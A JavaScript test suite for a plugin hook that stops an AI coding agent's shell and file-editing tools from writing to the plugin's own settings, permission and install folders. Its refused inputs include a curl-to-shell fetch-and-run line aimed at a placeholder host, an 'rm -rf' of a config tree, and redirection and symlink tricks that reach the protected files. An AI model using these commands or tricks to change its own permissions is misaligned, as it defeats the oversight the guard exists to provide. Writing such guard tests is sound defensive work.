// 1.6.1: the write guard against $.fs.stat answers in the shapes Claude Code 2.1.309 recorded. 1.6.0 read a missing
// path's rejection by `code`, which the host's rejection lacks, so every new path was refused as unresolvable.
const MAC_HOME = ['', 'Users', 'fixture'].join('/'), TMP = ['', 'private', 'tmp'].join('/');
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { runInNewContext } from 'node:vm';
import { registerTemp, trackTemp } from '../scripts/temp-leftovers.mjs';
import { recorded, hostDiskStat, hostStatFrom } from './fixtures/host-fs-stat.mjs';
import * as guard from '../plugins/sleight/hooks/preapproved-write-guard.mjs';
import { ordinaryDeveloperCommands, ordinaryExtras, ordinaryMultiline } from './fixtures/ordinary-developer-commands.mjs';

const SETTINGS = `${MAC_HOME}/Library/Application Support/sleight`;
const existing = new Set(['/', '/private', TMP, `${TMP}/hot161-file`, '/dev', '/dev/null', MAC_HOME,
  `${MAC_HOME}/Library`, `${MAC_HOME}/Library/Application Support`, SETTINGS]);
const stat = hostStatFrom(path => existing.has(path) ? path
  : path === `${TMP}/hot161-file/child` ? { errno: 'ENOTDIR' }
  : path === `${TMP}/dangling` ? { dangling: true }
  : path === `${TMP}/ENOENT` ? { errno: 'EACCES' }
  : undefined);
const options = { stat, cwd: TMP, home: MAC_HOME, configDir: `${MAC_HOME}/.claude`, platform: 'darwin' };
const target = input => guard.preapprovedWriteTarget(input, options);

test('the fake host stat reproduces every recorded 2.1.309 shape', async t => {
  assert.equal(recorded.claudeCode, '2.1.309');
  const root = registerTemp(t, realpathSync(trackTemp(mkdtempSync(join(tmpdir(), 'sleight-host-stat-')))));
  mkdirSync(join(root, 'dir')); writeFileSync(join(root, 'file'), 'hi\n');
  symlinkSync(join(root, 'nowhere'), join(root, 'dangling')); symlinkSync(join(root, 'dir'), join(root, 'linkdir'));
  const local = path => path.replace('{tmp}/hot161-fx', root).replace('{tmp}/1', join(root, '1'));
  assert.equal(recorded.cases.length, 9);
  for (const entry of recorded.cases) {
    const path = local(entry.path);
    const answer = await hostDiskStat(path).then(value => ({ value }), error => ({ error }));
    if (entry.rejects) {
      const { error } = answer;
      assert.ok(error, entry.case);
      assert.equal(error.constructor.name, entry.rejects.constructor, entry.case);
      assert.deepEqual(Object.getOwnPropertyNames(error).sort(), [...entry.rejects.ownProperties].sort(), entry.case);
      assert.equal(error.name, entry.rejects.name, entry.case);
      assert.equal(error.message, entry.rejects.message.replace(`(${entry.path})`, `(${path})`), entry.case);
      assert.equal('code' in error || 'errno' in error, false, entry.case);
      assert.equal(entry.rejects.code ?? entry.rejects.errno ?? null, null, entry.case);
    } else {
      const { value } = answer;
      assert.ok(value, entry.case);
      assert.deepEqual(Object.keys(value), entry.resolves.ownProperties, entry.case);
      const { kind, isLink, realPath } = entry.resolves.value;
      assert.deepEqual({ kind: value.kind, isLink: value.isLink, realPath: value.realPath }, { kind, isLink, realPath: realPath && local(realPath) }, entry.case);
    }
  }
});

const allowed = [
  'echo x 2>&1', `echo x > ${TMP}/newfile`, `mkdir -p ${TMP}/newdir`, 'echo x >&2', 'echo x 1>&2', 'cat <&0',
  'ls nowhere 2>&-', 'exec 3>&1-', 'echo x 2>&1 >/dev/null', 'echo x &>/dev/null', 'echo x > /dev/null 2>&1',
  'npm test 2>&1 | tail -5', `echo x > ${TMP}/missingdir/child`, `echo x > ${TMP}/hot161-file/child`,
  'touch new.txt', `cd ${TMP}/newdir && touch hand.txt`,
];
for (const command of allowed) test(`host-shaped stat allows ${command}`, async () => assert.equal(await target({ tool: 'Bash', command }), undefined));
for (const input of [{ tool: 'Write', file_path: `${TMP}/newfile.txt` }, { tool: 'Edit', file_path: `${TMP}/missingdir/new.md` },
  { tool: 'MultiEdit', edits: [{ file_path: `${TMP}/hot161-file/child` }] }])
  test(`host-shaped stat allows ${input.tool} of a new path`, async () => assert.equal(await target(input), undefined));

const refused = [
  [{ tool: 'Bash', command: `echo x > "${SETTINGS}/hand.json"` }, guard.PROTECTED.settings],
  [{ tool: 'Bash', command: 'echo x > "~/Library/Application Support/sleight/turbo.json" 2>&1' }, guard.PROTECTED.settings],
  // >& followed by a word that is not a descriptor writes stdout and stderr to that file.
  [{ tool: 'Bash', command: 'echo x >& "~/Library/Application Support/sleight/hand.json"' }, guard.PROTECTED.settings],
  [{ tool: 'Bash', command: 'mkdir -p ~/.claude/plugins/cache/m/sleight/lib' }, guard.PROTECTED.install],
  [{ tool: 'Write', file_path: `${SETTINGS}/permissions.json` }, guard.PROTECTED.settings],
  // A link that leads nowhere and an error other than ENOENT or ENOTDIR stay unresolvable, even with ENOENT in the path.
  [{ tool: 'Bash', command: `echo x > ${TMP}/dangling` }, guard.PROTECTED.unresolved],
  [{ tool: 'Write', file_path: `${TMP}/dangling` }, guard.PROTECTED.unresolved],
  [{ tool: 'Bash', command: `echo x > ${TMP}/ENOENT/x` }, guard.PROTECTED.unresolved],
];
for (const [input, label] of refused) test(`host-shaped stat still refuses ${input.command ?? `${input.tool} ${input.file_path}`}`, async () =>
  assert.equal(await target(input), label));

test('descriptor redirections are never stat\'ed, even with sleight\'s settings folder as cwd', async () => {
  const probed = [];
  const counted = async path => { probed.push(path); return stat(path); };
  const inSettings = { ...options, stat: counted, cwd: SETTINGS };
  for (const command of ['echo x 2>&1', 'echo x >&2', 'ls 2>&1 1>&2', 'echo x 3>&1', 'ls nowhere 2>&-', 'npm test 2>&1 | tail -5']) {
    probed.length = 0;
    assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command }, inSettings), undefined, command);
    assert.deepEqual(probed, [], command);
  }
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: 'echo x >& hand.json' }, inSettings), guard.PROTECTED.settings);
  probed.length = 0;
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: 'echo x >& out.log' }, { ...options, stat: counted }), undefined);
  assert.ok(probed.includes(`${TMP}/out.log`), probed.join(' '));
});

// Read-write opens and zsh's clobbering forms write their target (zsh -f and bash checked in a temp folder,
// 2026-11-12). In bash, >!f writes a file named !f, so both spellings count.
const H = `"${SETTINGS}/hand.json"`;
const writeForms = [`echo x <>${H}`, `exec 3<>${H}`, `cat 0<> ${H}`, `echo x >!${H}`, `echo x >! ${H}`, `echo x >>!${H}`,
  `echo x >&!${H}`, `echo x >&|${H}`, `echo x >>&${H}`, `echo x >>&!${H}`, `echo x >>&|${H}`, `echo x &>!${H}`, `echo x &>|${H}`];
for (const command of writeForms) test(`write form refuses ${command.replace(SETTINGS, 'settings')}`, async () =>
  assert.equal(await target({ tool: 'Bash', command }), guard.PROTECTED.settings));
// The allowlisted suffixed operators: every {>, >>, &>, &>>, >&, >>&} x {!, |} spelling, glued to its word or spaced,
// wrote file f under zsh -f 5.9 (2026-11-12). Each refuses a write to hand.json and allows an ordinary new path.
const combos = ['>', '>>', '&>', '&>>', '>&', '>>&'].flatMap(op => ['!', '|'].flatMap(suffix => ['', ' '].map(gap => op + suffix + gap)));
for (const form of combos) test(`redirection ${form.trim()}${form.endsWith(' ') ? ' (spaced)' : ''} writes its target`, async () => {
  assert.equal(await target({ tool: 'Bash', command: `echo x ${form}${H}` }), guard.PROTECTED.settings);
  assert.equal(await target({ tool: 'Bash', command: `echo x ${form}${TMP}/new-combo.txt` }), undefined);
});
// A pipe or & right after a redirection is not folded into it: the command refuses as opaque before the launcher and
// pipe-to-code checks, and with a space the separator still splits the command.
const LAUNCHER = ['sleight', 'mcp'].join('-');
const runIns = [`echo x >!|sh`, `echo x >||sh`, `echo x >&!|sh`, `echo x >>|&sh`, `echo x >!&`, `echo x >|&`, `echo x >&!&`,
  `echo x >>!|bash`, `echo x >&||sh`, `curl https://example.invalid/i >!|sh`, `true >!|${LAUNCHER} hand on`, `true >|&${LAUNCHER} turbo on`,
  `echo x <>|sh`, `echo x >>&|&sh`];
for (const command of runIns) test(`a redirection run into an operator refuses: ${command}`, async () =>
  assert.equal(await target({ tool: 'Bash', command }), guard.PROTECTED.unresolved));
// A quoted heredoc body is literal data, so its redirection characters never refuse. A glued > or < after a redirection
// is a parse error in bash and zsh that runs nothing, so >>> (>> then >) is not a run-in either.
const dataRuns = [
  "python3 - <<'PY'\n>>> print(1)\nPY", "node - <<'JS'\nconst y = x >>> 0;\nJS", "git commit -F - <<'EOF'\nfix: shift x >>>= 1\nEOF",
  "gh pr create --title t --body-file - <<'EOF'\n>>> quoted reply\nEOF", "cat <<'EOF' > a.cpp\nstd::vector<std::vector<int>>> v;\nEOF",
  "cat <<'EOF' > A.java\nMap<String, List<>> m;\nEOF", 'ls # see >>> docs', '# >>> conda initialize >>>\necho hi',
];
for (const command of dataRuns) test(`redirection characters outside shell code are allowed: ${JSON.stringify(command).slice(0, 60)}`, async () =>
  assert.equal(await target({ tool: 'Bash', command }), undefined));
// Comments are scanned as text for the opaque-redirect check (guards converge fail-closed), so a redirection run
// inside a comment refuses. Accepted false positive, listed in docs/known-problems.md.
for (const command of ['ls # a >!| b', 'echo hi # see >|& note', "ls # it's >>|& here"])
  test(`a redirection run in a comment is refused: ${JSON.stringify(command)}`, async () =>
    assert.equal(await target({ tool: 'Bash', command }), guard.PROTECTED.unresolved));
// sleight-arch's MEDIUM inputs: an apostrophe in a comment must not hide a later real opaque run or write.
for (const [command, label] of [["ls # it's\necho '\\' ; echo x >!|sh", guard.PROTECTED.unresolved],
  [`ls # it's a\necho x > "${SETTINGS}/hand.json"`, guard.PROTECTED.settings],
  [`echo $(echo hi)#x > "${SETTINGS}/hand.json"`, guard.PROTECTED.settings]])
  test(`a comment apostrophe does not desync quoting: ${JSON.stringify(command).slice(0, 48)}`, async () =>
    assert.equal(await target({ tool: 'Bash', command }), label));
// A backslash-newline inside an operator joins it in bash: >\<newline>>f is >>f (hot161b review, 72 fuzz hits).
const continued = ['>\\\n>', '>\\\n|', '>\\\n&', '<\\\n>', '2>\\\n>', '>\\\n\\\n>', '>>\\\n!'];
for (const form of continued) test(`a line continuation inside ${JSON.stringify(form)} still writes its target`, async () =>
  assert.equal(await target({ tool: 'Bash', command: `echo x ${form}${H}` }), guard.PROTECTED.settings));
// Security-review inputs: a continuation after ANSI-C quoting or a backtick substitution whose quotes a separate
// pre-pass misread. bash writes the target in each (checked in a scratch folder).
for (const prefix of ["echo $'\\'' ", "echo $'a\\'b' ", "echo `echo '\\\\'` "]) for (const op of ['>\\\n&', '>\\\n>'])
  test(`a continuation after ${JSON.stringify(prefix)} still writes its target via ${JSON.stringify(op)}`, async () =>
    assert.equal(await target({ tool: 'Bash', command: `${prefix}${op}${H}` }), guard.PROTECTED.settings));
test('a line continuation does not continue a comment, and ordinary continued commands pass', async () => {
  assert.equal(await target({ tool: 'Bash', command: `echo a # c \\\necho x >${H}` }), guard.PROTECTED.settings);
  for (const command of [`npm run build \\\n  > ${TMP}/build.log 2>&1`, `echo "a\\\nb" > ${TMP}/new.txt`, "echo 'a\\\n>!|' > out.txt"])
    assert.equal(await target({ tool: 'Bash', command }), undefined, command);
});
test('spaced separators after a redirection still reach the launcher and pipe checks', async () => {
  for (const command of [`true >! /dev/null | ${LAUNCHER} hand on`, `true >| /dev/null & ${LAUNCHER} turbo on`])
    assert.equal(await target({ tool: 'Bash', command }), guard.PROTECTED.launcher, command);
});
const ordinaryRedirects = ['cmd 2>&1 | tee new.log', 'cmd 2>&1|head', 'cmd >/dev/null 2>&1 &', 'cmd &>/dev/null', 'cmd >| new.txt',
  'a && b > new.txt', 'cmd > new.txt & wait', 'cmd >! new.txt', 'cmd >>| new.log 2>&1 | tail -3'];
for (const command of ordinaryRedirects) test(`ordinary redirection allowed: ${command}`, async () =>
  assert.equal(await target({ tool: 'Bash', command }), undefined));

test('bash\'s reading of >!name is checked too, and ordinary targets of every form pass', async () => {
  assert.equal(await target({ tool: 'Bash', command: 'cd ~/Library/Application\\ Support && echo x >!sleight' }), guard.PROTECTED.settings);
  for (const command of [`echo x <>${TMP}/new.txt`, `exec 3<>${TMP}/new.txt`, `echo x >!${TMP}/new.txt`, `echo x >&| ${TMP}/new.txt`, `echo x >>&!${TMP}/new.log`])
    assert.equal(await target({ tool: 'Bash', command }), undefined, command);
});
// zsh writes >&1- to a file named 1- (bash moves the descriptor). Only a bare descriptor number or - is skipped.
test('>&1- is a write in zsh and goes through the path checks', async () => {
  const probed = [];
  const counted = async path => { probed.push(path); return stat(path); };
  // Any file in the helper cache is protected, so 1- written there refuses.
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: 'echo x >&1-' }, { ...options, cwd: `${MAC_HOME}/Library/Caches/sleight`, stat: counted }), guard.PROTECTED.cache);
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: 'echo x >&1-' }, { ...options, stat: counted }), undefined);
  assert.ok(probed.includes(`${TMP}/1-`), probed.join(' '));
});

test('a dangling link into sleight\'s settings folder is refused on the real disk', async t => {
  const root = registerTemp(t, realpathSync(trackTemp(mkdtempSync(join(tmpdir(), 'sleight-host-dangling-')))));
  const settings = join(root, 'Library/Application Support/sleight');
  mkdirSync(settings, { recursive: true });
  symlinkSync(join(settings, 'hand.json'), join(root, 'innocent'));
  const disk = { stat: hostDiskStat, cwd: root, home: root, platform: 'darwin' };
  for (const input of [{ tool: 'Write', file_path: join(root, 'innocent') }, { tool: 'Bash', command: `echo x > ${join(root, 'innocent')}` }])
    assert.equal(await guard.preapprovedWriteTarget(input, disk), guard.PROTECTED.unresolved, JSON.stringify(input));
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: `echo x > ${join(root, 'new.txt')} 2>&1` }, disk), undefined);
});

// The reviewer's ordinary developer corpus on a real disk with the host-shaped stat: every command and every new-file
// Write or Edit is allowed. It stays green through every guard change.
test('the ordinary developer corpus is allowed on a real disk', async t => {
  assert.equal(ordinaryDeveloperCommands.length, 64);
  const root = registerTemp(t, realpathSync(trackTemp(mkdtempSync(join(tmpdir(), 'sleight-ordinary-')))));
  const cwd = join(root, 'repo'), home = join(root, 'home');
  mkdirSync(join(cwd, 'src'), { recursive: true }); mkdirSync(home); writeFileSync(join(cwd, 'package.json'), '{}');
  const disk = { stat: hostDiskStat, cwd, home, configDir: join(home, '.claude'), platform: 'darwin' };
  const refused = [];
  for (const command of [...ordinaryDeveloperCommands, ...ordinaryExtras, ...ordinaryMultiline]) {
    const label = await guard.preapprovedWriteTarget({ tool: 'Bash', command }, disk);
    if (label) refused.push(`${command}: ${label}`);
  }
  for (const path of [join(cwd, 'new.txt'), join(cwd, 'src/deep/er/new.txt')]) for (const tool of ['Write', 'Edit']) {
    const label = await guard.preapprovedWriteTarget({ tool, file_path: path }, disk);
    if (label) refused.push(`${tool} ${path}: ${label}`);
  }
  assert.deepEqual(refused, []);
});

// Timing. The host answered stat in 0.06 to 1.45 ms at load 4 and 23. One slow stat is unknown for its own path only;
// the decision deadline (2.5 s) makes every later stat unknown.
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const slowStat = (ms, inner = stat) => async path => { await sleep(ms); return inner(path); };

test('a stat at 110 ms per call still allows an ordinary new-path write', async () => {
  const slow = { ...options, stat: slowStat(110) };
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: `echo x > ${TMP}/newfile` }, slow), undefined);
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Write', file_path: `${TMP}/newfile.txt` }, slow), undefined);
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: `echo x > "${SETTINGS}/hand.json"` }, slow), guard.PROTECTED.settings);
});

test('a hung stat refuses its own decision only', { timeout: 5000 }, async () => {
  const hung = { ...options, stat: path => path === '/hung' ? new Promise(() => {}) : stat(path) };
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: `cd /hung; touch out.txt; echo x > ${TMP}/newfile` }, hung), guard.PROTECTED.unresolved);
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: `echo x > ${TMP}/newfile` }, hung), undefined);
});

// A stat that times out may only make the answer stricter than the fully resolved one. Each row is refused with every
// stat answered, and with the named stat hanging past its 750 ms budget.
const CFG = `${TMP}/cfg`, CACHE = `${MAC_HOME}/Library/Caches/sleight`;
const tree = new Map([[CFG, CFG], [`${CFG}/plugins`, `${CFG}/plugins`], [`${CFG}/plugins/cache`, `${CFG}/plugins/cache`],
  [`${CFG}/plugins/cache/market`, `${CFG}/plugins/cache/market`], [`${CFG}/plugins/cache/market/sleight`, `${CFG}/plugins/cache/market/sleight`],
  [`${MAC_HOME}/Library/Caches`, `${MAC_HOME}/Library/Caches`], [CACHE, CACHE], ['/lnk', SETTINGS], ['/lnk-cache', CACHE]]);
const treeStat = hang => hostStatFrom(path => path === hang ? new Promise(() => {})
  : existing.has(path) ? path : tree.get(path) ?? (path.startsWith('/lnk/') ? SETTINGS + path.slice(4) : undefined));
const timeoutRows = [
  ['above the install', `rm -rf ${CFG}`, `${CFG}/plugins/cache`, guard.PROTECTED.aboveInstall],
  ['the marketplace folder above an install', `rm -rf ${CFG}/plugins/cache/market`, `${CFG}/plugins/cache/market/sleight`, guard.PROTECTED.aboveInstall],
  ['in the helper cache folder', `cd "${CACHE}"; touch x`, CACHE, guard.PROTECTED.cache],
  ['behind a link into the helper cache', 'cd /lnk-cache && touch x', '/lnk-cache', guard.PROTECTED.cache],
  ['behind a link into the settings folder', { tool: 'Write', file_path: '/lnk/hand.json' }, '/lnk', guard.PROTECTED.settings],
];
for (const [name, input, hang, label] of timeoutRows) test(`a timed-out stat ${name} still refuses`, { timeout: 5000 }, async () => {
  const event = typeof input === 'string' ? { tool: 'Bash', command: input } : input;
  const opts = { ...options, configDir: CFG };
  assert.equal(await guard.preapprovedWriteTarget(event, { ...opts, stat: treeStat() }), label, 'every stat answered');
  assert.ok(await guard.preapprovedWriteTarget(event, { ...opts, stat: treeStat(hang) }), `${hang} timed out`);
});
test('a timed-out cd into sleight\'s settings folder refuses even an ordinary name', { timeout: 5000 }, async () => {
  const command = `cd "${SETTINGS}"; touch notes.txt`;
  assert.equal(await target({ tool: 'Bash', command }), undefined, 'every stat answered');
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command }, { ...options, stat: treeStat(SETTINGS) }), guard.PROTECTED.unresolved);
});
test('slow stats that all answer within budget allow an ordinary new path behind a link', async () => {
  const slow = { ...options, stat: slowStat(110, treeStat()) };
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: `cd /lnk && echo x > notes.txt` }, slow), undefined);
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Write', file_path: '/lnk/notes.txt' }, slow), undefined);
});

test('the decision deadline still fails closed', { timeout: 8000 }, async () => {
  const start = performance.now();
  const slow = { ...options, stat: slowStat(600) };
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: `echo x > ${TMP}/a/b/c/d/new` }, slow), guard.PROTECTED.unresolved);
  const elapsed = performance.now() - start;
  assert.ok(elapsed >= 2400 && elapsed < 4000, `${elapsed} ms`);
});

test('with every timer firing at once, descriptor redirections still allow and new-path writes refuse', async () => {
  let scheduled = 0;
  const now = { ...options, after: (ms, fn) => { scheduled++; fn(); return { cancel() {} }; } };
  for (const command of ['npm test 2>&1 | tail -5', 'make 2>&1', 'echo x >&2', 'ls 2>&1 1>&2', 'cat <&0'])
    assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command }, now), undefined, command);
  assert.equal(scheduled, 0, 'commands with no write path schedule no timer');
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Bash', command: `echo x > ${TMP}/new` }, now), guard.PROTECTED.unresolved);
  assert.equal(await guard.preapprovedWriteTarget({ tool: 'Write', file_path: `${TMP}/new` }, now), guard.PROTECTED.unresolved);
});

const ts = await import('typescript').then(module => module.default).catch(error => {
  if (error.code === 'ERR_MODULE_NOT_FOUND') return undefined;
  throw error;
});
// Public CI and the Linux preflight run npm test on a checkout with no node_modules, so typescript is absent there
// and these tests skip. With node_modules installed (npm run check) a missing typescript fails them instead.
const hookSkip = !ts && !existsSync(new URL('../node_modules', import.meta.url)) && 'needs typescript (checkout without node_modules)';

function installedHook($) {
  assert.ok(ts, 'typescript is missing although node_modules is installed');
  const exports = {}, hooks = new Map();
  const source = readFileSync(new URL('../plugins/sleight/hooks/register.tsx', import.meta.url), 'utf8');
  const js = ts.transpileModule(source, { compilerOptions: { module: ts.ModuleKind.CommonJS, jsx: ts.JsxEmit.ReactJSX } }).outputText;
  runInNewContext(js, { exports, require(name) {
    if (name === 'claude-code') return { atom: (_key, value) => ({ value }) };
    if (name === './preapproved-write-guard.mjs') return guard;
    if (name === './narration.mjs') return { createNarrationCache: () => ({}) };
    return {};
  } });
  exports.register((name, filter, handler) => { hooks.set(name, handler ?? filter); return { catch() {} }; });
  return event => hooks.get('classic.PreToolUse')($, event, () => ({ passed: true }));
}
function hookTree(t) {
  const root = registerTemp(t, realpathSync(trackTemp(mkdtempSync(join(tmpdir(), 'sleight-host-hook-')))));
  const home = join(root, 'home'), cwd = join(root, 'repo');
  mkdirSync(join(home, 'Library/Application Support/sleight'), { recursive: true }); mkdirSync(cwd);
  return { root, home, cwd };
}

test('the installed PreToolUse hook passes new paths with the host-shaped $.fs.stat', { skip: hookSkip }, async t => {
  const { root, home, cwd } = hookTree(t);
  const unresolved = [];
  const pre = installedHook({ session: { cwd: async () => cwd }, env: { get: async key => key === 'HOME' ? home : undefined },
    clock: { after(ms, fn) { const id = setTimeout(fn, ms); return { cancel() { clearTimeout(id); } }; } },
    fs: { stat: async (path, statOptions) => { if (statOptions?.resolve !== true) unresolved.push(path); return hostDiskStat(path); } } });
  for (const command of ['echo x 2>&1', `echo x > ${root}/newfile`, `mkdir -p ${root}/newdir`, 'touch new.txt 2>&1'])
    assert.deepEqual(await pre({ tool: 'Bash', command }), { passed: true }, command);
  assert.deepEqual(await pre({ tool: 'Write', file_path: join(cwd, 'new.txt') }), { passed: true });
  assert.match((await pre({ tool: 'Bash', command: `echo x > "${home}/Library/Application Support/sleight/hand.json"` })).deny, /settings files/);
  assert.match((await pre({ tool: 'Write', file_path: join(home, 'Library/Application Support/sleight/hand.json') })).deny, /settings files/);
  assert.deepEqual(unresolved, []);
});

test('the installed hook with a slow $.fs.stat and a late $.clock.after still passes new paths', { skip: hookSkip }, async t => {
  const { root, home, cwd } = hookTree(t);
  const asked = new Set();
  let scheduled = 0, cancelled = 0;
  // Each stat takes 110 ms, and the host clock fires 50 ms late.
  const pre = installedHook({ session: { cwd: async () => cwd }, env: { get: async key => key === 'HOME' ? home : undefined },
    clock: { after(ms, fn) { asked.add(ms); scheduled++; const id = setTimeout(fn, ms + 50); return { cancel() { cancelled++; clearTimeout(id); } }; } },
    fs: { stat: async path => { await sleep(110); return hostDiskStat(path); } } });
  assert.deepEqual(await pre({ tool: 'Bash', command: `echo x > ${root}/newfile 2>&1` }), { passed: true });
  assert.deepEqual(await pre({ tool: 'Write', file_path: join(cwd, 'new.txt') }), { passed: true });
  assert.match((await pre({ tool: 'Bash', command: `echo x > "${home}/Library/Application Support/sleight/hand.json"` })).deny, /settings files/);
  assert.deepEqual([...asked].sort((a, b) => a - b), [750, 2500]);
  assert.equal(scheduled, cancelled);
});
